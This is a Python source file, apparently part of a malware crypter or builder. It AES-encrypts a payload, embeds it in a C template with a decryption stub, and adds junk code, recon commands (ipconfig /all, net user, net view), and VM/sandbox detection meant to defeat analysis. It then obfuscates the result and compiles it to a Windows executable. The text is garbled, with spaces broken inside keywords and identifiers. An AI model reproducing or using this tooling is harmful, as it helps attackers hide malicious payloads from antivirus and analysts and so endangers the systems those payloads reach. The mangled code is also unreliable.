import os



import tempfile



import subprocess



import random



import str in g



from typ in gimport List,Dict,Any,Union,Optional







from core.interfacesimport Bas eGenerator,Bas eObfuscator,Bas eEvas ionTechnique



from utils.cryptoimport aes_encrypt,encode_bas e64,generate_key,generate_encryption_stub



from utils.code_generatorimport(



random_variable_name,



random_function_name,



generate_junk_code,



generate_dead_code,



generate_anti_analysis



)







clas sExeGenerator(Bas eGenerator):











def__init__(self):



        self.template_path=None



self.template_file="template1.c"







defgenerate(self,



payload:str,



template_path:str,



obfuscators:List=None,



evas ion_techniques:List=None,



iterations:int=1)->bytes:







self.template_path=template_path











template_file_path=os.path.join(template_path,self.template_file)



if notos.path.exists(template_file_path):



            template_file_path=os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),



"templates","exe",self.template_file)







if notos.path.exists(template_file_path):



            raiseFileNotFoundError(f"Шаблон не найден: {template_file_path}")







withopen(template_file_path,'r')as f:



            template=f.read()











payload_type="command"



if os.path.exists(payload)andos.path.isfile(payload):



            payload_type="file"



withopen(payload,'rb')as f:



                payload_data=f.read()



else:







            payload_data=payload.encode('utf-8')











key=generate_key(32)



encrypted_payload,key,iv=aes_encrypt(payload_data,key)











formatted_payload=self._format_bytes_for_c(encrypted_payload)



formatted_key=self._format_bytes_for_c(key)



formatted_iv=self._format_bytes_for_c(iv)











decrypt_function=generate_encryption_stub("c","aes")











junk_code=self._generate_junk_code()



dead_code=self._generate_dead_code()



anti_analysis=self._generate_anti_analysis_code()











template=template.replace("{{PAYLOAD}}",formatted_payload)



template=template.replace("{{PAYLOAD_SIZE}}",str(len(encrypted_payload)))



template=template.replace("{{KEY}}",formatted_key)



template=template.replace("{{KEY_SIZE}}",str(len(key)))



template=template.replace("{{IV}}",formatted_iv)



template=template.replace("{{IV_SIZE}}",str(len(iv)))



template=template.replace("{{PAYLOAD_TYPE}}",f'const char* type_var = "{payload_type}";')



template=template.replace("{{DECRYPT_FUNC}}",decrypt_function)



template=template.replace("{{JUNK_CODE}}",junk_code)



template=template.replace("{{DEAD_CODE}}",dead_code)



template=template.replace("{{ANTI_ANALYSIS}}",anti_analysis)











if obfuscators:



            obfuscated_code=template



for_inrange(iterations):



                forobfuscator in obfuscators:



                    obfuscated_code=obfuscator.obfuscate(obfuscated_code)



template=obfuscated_code











if evas ion_techniques:



            evas ion_code=template



fortechnique in evas ion_techniques:



                evas ion_code=technique.apply(evas ion_code)



template=evas ion_code











return self._compile_code(template)







def_format_bytes_for_c(self,data:bytes)->str:







return", ".join([f"0x{b:02x}"forb in data])







def_generate_junk_code(self)->str:







return"""
// Мусорный код для запутывания анализа
void junk_function() {
    int junk1 = 0;
    char junk2[100];
    float junk3 = 3.14;
    
    for (int i = 0; i < 10; i++) {
        junk1 += i;
        junk2[i] = (char)(65 + i);
        junk3 *= 1.01;
    }
    
    if (junk1 > 100) {
        junk3 = 0;
    }
}
"""







def_generate_dead_code(self)->str:







return"""
// Мертвый код, который никогда не выполнится
int never_executed() {
    if (0) {
        FILE *f = fopen("c:\\w in dows\\system32\\drivers\\etc\\hosts", "r");
        if (f) {
            char buffer[1024];
            while (fgets(buffer, sizeof(buffer), f)) {
                pr in tf("%s", buffer);
            }
            fclose(f);
        }
        
        system("ipconfig /all");
        system("net user");
        system("net view");
    }
    
    return 0;
}
"""







def_generate_anti_analysis_code(self)->str:







return"""
// Проверка на виртуальные машины и песочницы
BOOL check_vm() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    
    // Проверка на малое количество процессоров (часто в VM)
    if (si.dwNumberOfProcessors < 2) {
        return TRUE;
    }
    
    // Проверка на малый объем памяти
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 1 * 1024 * 1024 * 1024) { // Меньше 1 ГБ
        return TRUE;
    }
    
    // Проверка имени компьютера
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    
    if (strstr(computerName, "VIRTUAL") || 
        strstr(computerName, "VMware") || 
        strstr(computerName, "VirtualBox")) {
        return TRUE;
    }
    
    return FALSE;
}
"""







def_compile_code(self,code:str)->bytes:











withtempfile.TemporaryDirectory()as temp_dir:







            source_file=os.path.join(temp_dir,"payload.c")



withopen(source_file,"w")as f:



                f.write(code)











output_file=os.path.join(temp_dir,"payload.exe")











try:







                if'TESTING'inos.environ:



                    return code.encode('utf-8')











compile_cmd=[



"gcc",source_file,"-o",output_file,



"-mw in dows",



"-lcrypt32",



"-Os"



]











result=subprocess.run(



compile_cmd,



capture_output=True,



check=True



)











withopen(output_file,"rb")as f:



                    compiled_b in ary=f.read()







return compiled_b in ary







except subprocess.CalledProcessErroras e:



                raiseRuntimeError(f"Ошибка компиляции: {e.stderr.decode()}")from e



except Exceptionas e:



                raiseRuntimeError(f"Ошибка при создании исполняемого файла: {str(e)}")from e